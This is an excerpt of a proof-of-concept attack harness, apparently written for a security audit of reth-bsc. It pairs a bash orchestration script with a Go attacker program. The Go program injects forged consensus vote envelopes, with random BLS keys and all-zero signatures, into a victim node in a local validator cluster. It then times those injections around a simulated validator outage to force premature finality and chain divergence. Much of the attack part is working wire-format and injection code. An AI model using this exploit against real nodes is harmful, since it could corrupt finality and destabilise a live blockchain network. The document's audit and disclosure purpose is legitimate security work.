...
echo "[clean] validator cluster stopped (.local data retained; use CLUSTER_RESET=1 ./poc.sh to rerun)."
fi
...
command -v $bin >/dev/null || { echo "FATAL: required $bin on host"; exit 1; }
done
# Go (attacker, create-validator, make geth) — install if missing
...
go version | tee -a "$OUT/toolchain.log" >/dev/null || { echo "FATAL: go unavailable"; exit 1; }
# Foundry (reset_genesis: forge install/build) — install if missing
if ! command -v forge >/dev/null; then
echo "    forge not found — installing foundry (several minutes)..."
...
command -v forge >/dev/null || { echo "FATAL: forge unavailable after bootstrap — see $OUT/toolchain.log"; exit 1; }
# Poetry (reset_genesis: poetry install/run) — install if missing
if ! command -v poetry >/dev/null; then
echo "    poetry not found — installing via pip3 --user..."
pip3 install --user poetry >>"$OUT/toolchain.log" 2>&1 || true
fi
command -v poetry >/dev/null || echo "    WARN: poetry missing — reset may fail during genesis generation"
...
# [0b/9] Victim binary not present yet -> host make build (once, 10-40 minutes).
if [ -z "$RETH_BIN" ] && [ "${RETH_FORCE_DOCKER:-0}" != "1" ]; then
echo "    Victim binary not present — host 'make build' (log: $OUT/victim-make.log)"
...
// Victim dials the attacker (admin_addPeer) -> attacker = responder
// -> forkid-echo self-consistent by construction.
// Phases: OBSERVE -> CONTROL -> ATTACK -> PERSIST -> FORENSIC.
package main
import (
"crypto/ecdsa"
"crypto/rand"
...
// ===== Wire types — field order = RLP field order (vote.rs; locked to proto.rs reference vector) =====
...
VoteAddress [48]byte // garbage — never parsed as a BLS point (RC-1)
Signature   [96]byte // ZERO — never verified (RC-1)
Data        VoteData
}
type votesPacket struct{ Votes []*VoteEnvelope } // RLP [[env...]] — 2-level wrapper
type capPacket struct {                          // RLP [version, extra] — parity with go-bsc
ProtocolVersion uint64
Extra           []byte
}
type forkID struct { // parity with RLP forkid.ID (EIP-2124): [Hash 32B, Next uint64]
Hash [4]byte
Next uint64
}
...
// register_peer() -> sync_pending_votes_to_peer(): pool dump is sent to the new session
...
if wrongTarget { // negative control: bucket that is never read
...
for i := 0; i < quorum; i++ {
var addr [48]byte
rand.Read(addr[:]) // garbage BLS pubkey
book[addr] = true
if err := inj.send(&VoteEnvelope{
VoteAddress: addr,
Signature:   [96]byte{}, // ZERO
Data: VoteData{
...
// Window: until a new head OR finality jumps OR timeout.
// Premature = finalized reaches n-1 WHILE head is still n
// (organic BEP-126: finalized = head-2; n-1 only becomes organic after block n+1 lands).
after := before
...
forgedThis = true // PREMATURE — before the next block
} else {
lateThis = true // reached but after head moved = organic
}
after = f
break
}
...
fmt.Println("FAILED: bsc/2 session not established — check VICTIM_RPC / ADVERTISE_IP / port"); os.Exit(1)
}
...
log.Warn("CHECKPOINT-1 FAILED — organic finality not moving (validators not voting?). Setup limitation, NOT a refutation of findings (engine evidence: in-tree unit tests + source).")
}
...
if ctlForged == 0 {
log.Warn("NEGATIVE CONTROL OK — wrong vote target does not change finality")
} else {
log.Error("CONTROL ANOMALY — finality changed without valid target_hash")
}
log.Warn("=== PHASE 3: ATTACK (quorum garbage envelopes per head, 0 valid signatures) ===")
...
log.Warn("=== PHASE 4: PERSIST (injection STOPPED — poison re-read by import path?) ===")
...
"note", "flapping = inconsistent finality view across FCUs (poison vs snapshot)")
...
inj.mu.Unlock()
if armed && seen > 0 {
log.Error(">>> VICTIM RETRANSMITS UNVERIFIED ENVELOPES (WIRE PROOF) <<<",
"votes_disinkronkan", seen, "attacker_envelope_hits", hit,
"note", "sync_pending_votes_to_peer rebroadcasts pool contents (including junk votes) to new peers")
found = true
}
}
if !found {
log.Warn("forensic: sync-dump not received (pool empty / reconnect failed)")
}
if atkForged > 0 {
os.Exit(0)
}
...
|| { echo "FATAL: failed to clone node-deploy"; exit 1; }
fi
# --- Genesis surgery: equalize geth <-> reth genesis header constructors ---
# reth includes post-merge fields in the genesis header; geth omits them.
# Inject field values + activate forks at that genesis timestamp -> identical header -> identical hash.
...
ts = 0
# v6: ft must be in the future relative to the ENTIRE run (wall clock), not the template timestamp.
# Empirical 08:39 & 16:48: ft in the past -> time-fork active from early blocks ->
# geth vs reth fork ID diverges -> victim gets 0 peers without WARN.
...
# Auto-fix node-deploy (idempotent — a fresh clone brings back the upstream bugs):
fix_node_deploy() {
[ -f "$DEPLOY_DIR/bsc_cluster.sh" ] || return 0
...
# Diagnostic evidence: flag = init+30s; blocks 8/9/10 sub-second = maxwell/fermi active
# (ms timestamp + 1.5s interval) -> block-9 stall & fork-ID divergence.
...
# (2) newer forge versions fail to checkout forge-std v1.7.3 (submodule ds-test) -> manual git clone
...
echo "    genesis template not present yet — initial reset (15-40 minutes on first run)..."
...
# divergence. v5: RANDOM DYNAMIC p2p/disc ports + flags identical to the original victim +
# cleanup of leftover containers + dump 'ss' on failure.
# INSIGHT: plato activation in reth-bsc is BLOCK-BASED (is_plato_active_at_block
# in get_finalized_number_and_hash & pre_execution.rs); the template already has
# platoBlock:7 → plato DOES NOT affect the genesis hash. The all-zero divergence
# (0x61ca) comes from shanghai/cancun/prague=0. The main candidate '-plato'
# = exact replica of the 07:08 run config that previously MATCHED.
echo "[2b/9] Genesis calibration v5..."
docker rm -f reth-probe reth-victim >/dev/null 2>&1 || true  # leftovers from old runs
...
echo "    building reth image (once; log: $OUT/victim-build.log)..."
...
echo "--- ss -ltnp (TCP probe port):"; ss -ltnp 2>/dev/null | grep -E ":($p2p|$pp)\b" || echo "(none)"
...
# SANITY (mode ""): all Time=ft. Must MATCH — reth=? means the probe is broken.
...
if [ -z "$SHR" ]; then
echo "FATAL: reth probe did not respond for sanity — PROBE broken, not divergence."
echo "  Send: $OUT/probe-reth-crash.log"; exit 1
fi
if [ "$SHG" != "$SHR" ]; then
echo "FATAL: sanity diverged (geth=$SHG reth=$SHR) — send $CAL_LOG"; exit 1
fi
echo "    sanity OK — probe healthy (baseline: $SHG)"
# Candidates: '-plato' first (replica of 07:08 — predicted MATCH, plato active via platoBlock:7)
WINNER=""
...
[ -n "$WINNER" ] || { echo "FATAL: no candidate matched — send $CAL_LOG + probe-reth-crash.log"; exit 1; }
echo "    WINNER: $WINNER"
# ---------------------------------------------------------------- [2c/9] CLUSTER ENSURE
...
if [ "$NEED" = "1" ]; then
echo "    resetting cluster (surgery mode=$WINNER)..."
...
[ "$UGOK" = "1" ] || { echo "FATAL: cluster did not come up — send $OUT/deploy-reset.log"; exit 1; }
UGH=-1
...
echo "FATAL: validator is not mining (head=$UGH after 120s) — send $OUT/deploy-reset.log"; exit 1
fi
...
echo "FATAL: post-merge field ($UG_DWHAT) appears starting from block $UG_DIRTY — mid-chain transition is still active."
...
echo "    validator: mining OK (head=$UGH), blocks 1..12 PRE-FT (clean) — no mid-chain transition"
MH=$(m_blk0)
...
# v9: --override.<forktime> flag is ALWAYS present (start_node sets it);
# what is checked is the VALUE — it must not be <= now.
UG_NOW=$(date +%s)
...
echo "    flag check OK — all --override fork-time values are in the future"
...
collect_enodes() {
# (1) StaticNodes config.toml — nodekey fixed in keys/ => enode stable across resets
local found
found=$(grep -rhoE "enode://[0-9a-f]{128}@[0-9.]+:[0-9]+" \
"$DEPLOY_DIR"/.local/node*/config.toml 2>/dev/null | sort -u)
[ -n "$found" ] && { echo "$found"; return 0; }
# (2) fallback: RPC admin_nodeInfo (validator alive)
local p e
...
rm -rf "$VICTIM_DATA"
if [ -n "$RETH_BIN" ]; then
echo "    host-binary mode: $RETH_BIN"
...
echo "    docker mode (building official reth-bsc Dockerfile; 20-60 minutes on first run)..."
# Keep build context small (poc-attack contains chaindata + hundreds of MB of bsc clone)
if ! grep -q "^poc-attack" "$RETH_SRC/.dockerignore" 2>/dev/null; then
printf '
...
--http.api eth,net,web3,admin \
"${TRUSTED[@]}" >/dev/null \
|| { echo "FATAL: victim run failed — docker logs $VICTIM_CTR"; exit 1; }
fi
# ---------------------------------------------------------------- [5/9] sync checkpoint
...
echo "  Rerun ./poc.sh (phase [2b] will automatically re-converge).
Recurring? send audit-out/genesis-calibration.log + deploy-reset.log + jq -c '.config' poc-attack/node-deploy/genesis/genesis.json"
exit 1
fi
echo "    genesis hash match: $GH1"
echo "[5/9] CHECKPOINT: waiting for victim to sync from validator cluster..."
V=0
...
| jq -r '.result | if (.withdrawals | type) == "array" then "post-merge ACTIVE (fork-ID diverges!)" else "clean" end' 2>/dev/null
...
echo "[6/9] CHECKPOINT-1: verify organic finality is moving (normal flow)..."
...
echo "    !! CHECKPOINT-1 FAILED within 300s — window may be closed (setup limitation). Run continues for an honest transcript."
fi
# ---------------------------------------------------------------- [7/9] BEFORE
...
print(-1)" 2>/dev/null || echo -1)
echo "    attestation: latest validator block extraData = ${ATST}B (>~250 = attestation present; <160 = validators without vote-keys)"
...
# Realistic scenario (has happened on BSC): 2/3 validators down -> organic
# quorum lost -> the entire geth network freezes finality. The reth victim
# keeps advancing finalized from attacker garbage votes -> DIVERGENCE vs the
# geth control node. This is the only forge window: the FIRST solo block after outage
# (pre-death attestation raises justified to head-1; organic votes for the new
# head = 1 < quorum; garbage completes the count).
...
# reset may only init — ensure the process is alive (restart = stop+start)
sleep 3
...
# RPC port from process cmdline (flag --http.port); fallback to local config
CRPC=""
...
echo "--- fullnode processes:"; pgrep -af fullnode || echo "(none)"
...
echo "    waiting for control to sync to victim head..."
SYNCED=0; CV=-1; VV=-1
for i in $(seq 1 180); do
...
# [8c] attacker in background — inject on every new head, continuously
echo "    [8c] attacker background (inject per head; sync-dump on every reconnect = evidence of ingestion+propagation)..."
...
echo "    PHASE 3 active — attacker injecting every new head"
# [8d] OUTAGE: stop 2/3 validators; monitor divergence every second
...
# [8e] recovery + post-outage samples
...
if [ "$DIV" = "1" ]; then
ARC=0
echo ">>> PREMATURE FINALITY VIA GARBAGE VOTES: victim diverged from network (max_delta=$MAXD, first=$DIV_AT) <<<"
fi
...
echo "Evidence: $OUT/outage-timeline.log  — delta>0 during outage (victim vs geth control)"
...
echo "  1) tail $TL: head_v STUCK while head_c advances -> victim rejects solo wiggle blocks;"
echo "     confirm: grep -c 'backoff period' $OUT/victim-final.log"
echo "  2) fin_v == fin_c from the start -> gate window (justified==head-1) never opened;"
